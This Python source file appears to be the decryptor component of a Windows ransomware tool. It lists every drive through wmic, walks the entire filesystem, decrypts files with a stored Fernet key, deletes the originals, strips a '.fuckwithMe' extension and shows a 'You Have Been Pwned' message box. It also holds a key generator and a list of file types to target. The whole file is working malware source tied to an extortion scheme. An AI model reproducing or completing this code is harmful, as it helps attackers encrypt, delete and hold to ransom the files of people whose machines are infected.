import cryptography.fernet as frnet
import os
import platform
import tkinter as tk
from tkinter import messagebox

Files = []

def showMsgBox(message):
    messagebox.showinfo("0xA24",message)
    
def loadThePartitions():
    drives_info = (
        os.popen("wmic logicaldisk get caption, drivetype").read().splitlines()
    )
    drives = []
    for drive_info in drives_info:
        parts = drive_info.split()

        if len(parts) < 2:
            continue

        drive = parts[0].strip()
        drive_type = parts[1].strip()
        if drive_type not in ["5"] and len(drive) == 2:
            drives.append(drive)
    return drives


def loadTheEntireSystem():
    global Files
    important_file_extensions = [
        # Text and Markup Files
        ".txt",
        ".md",
        ".html",
        ".xml",
        ".json",
        ".yaml",
        ".yml",
        # Programming Languages
        ".py",
        ".js",
        ".php",
        ".cpp",
        ".h",
        ".java",
        ".cs",
        ".rb",
        ".swift",
        ".go",
        ".rs",
        ".ts",
        ".sh",
        ".ps1",
        ".sql",
        ".bat",
        # Web Development
        ".css",
        ".scss",
        ".sass",
        ".less",
        ".ts",
        ".jsx",
        ".vue",
        # Database Files
        ".sql",
        ".db",
        ".sqlite",
        ".csv",
        # Image Files
        ".jpg",
        ".jpeg",
        ".png",
        ".gif",
        ".bmp",
        ".svg",
        ".webp",
        ".tiff",
        # Audio and Video Files
        ".mp3",
        ".wav",
        ".ogg",
        ".mp4",
        ".mkv",
        ".avi",
        ".mov",
        # Document Files
        ".pdf",
        ".doc",
        ".docx",
        ".xls",
        ".xlsx",
        ".ppt",
        ".pptx",
        ".odt",
        ".rtf",
        ".tex",
        # Compressed Files
        ".zip",
        ".tar",
        ".rar",
        ".zip",
    ]

    for drive in loadThePartitions():
        try:
            for root, _, files in os.walk(f"{drive}//"):
                for file in files:
                    Files.append(root.replace("\\", "/") + "/" + file)
        except:
            pass


class cls_winBET:

    def __init__(self, KeyPath):
        self.key = self.loadKey(KeyPath)
        if self.is_windows is not True:
            exit(0)

    def generateKey(self):
        key = frnet.Fernet.generate_key()
        with open("secretToken.key", "wb") as file:
            file.write(key)

    def loadKey(self, KeyPath):
        with open(KeyPath, "rb") as file:
            return file.read()

    def delete_orginal_file(self, filename: str):
        try:
            os.remove(filename)
        except Exception as exp:
            print(f"Could Not Delete {exp} ")

    def decrypt_file(self, filename: str):
        if os.path.exists(filename):
            cipher = frnet.Fernet(self.key)
            EXT = ".fuckwithMe"
            try:
                with open(filename, "rb") as file:
                    plainText = file.read()
                cipherText = cipher.decrypt(plainText)
                self.delete_orginal_file(filename)
                with open(filename.replace(EXT,""), "wb") as encryptedFile:
                    encryptedFile.write(cipherText)
            except:
                pass

    @property
    def is_windows(self):
        return platform.platform().lower().__contains__("windows")


winBet = cls_winBET("secretToken.key")
loadTheEntireSystem()
def main():
    for file in Files:
        winBet.decrypt_file(file)
    root = tk.Tk()
    root.withdraw()  
main()
showMsgBox("You Have Been Pwned")